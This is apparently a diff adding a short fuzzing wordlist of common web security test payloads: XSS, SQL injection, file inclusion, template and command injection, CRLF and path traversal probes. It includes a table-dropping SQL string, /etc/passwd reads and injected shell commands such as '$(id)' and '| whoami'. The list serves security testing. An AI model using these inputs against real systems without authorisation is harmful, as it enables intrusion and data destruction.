@@ -1,0 +1,39 @@
+# Common Security Test Payloads
+# Mixed payloads for general fuzzing
+
+# XSS
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+
+# SQLi
+' OR 1=1--
+' OR '1'='1
+1; DROP TABLE users--
+
+# LFI
+../../../etc/passwd
+/etc/passwd
+
+# SSTI
+{{7*7}}
+${7*7}
+<%= 7*7 %>
+
+# Command Injection
+; id
+| id
+`id`
+$(id)
+; ls -la
+| whoami
+
+# CRLF Injection
+%0d%0aHeader: injected
+\r\nHeader: injected
+
+# Path Traversal
+../
+..%2F
+%2e%2e%2f
+....//
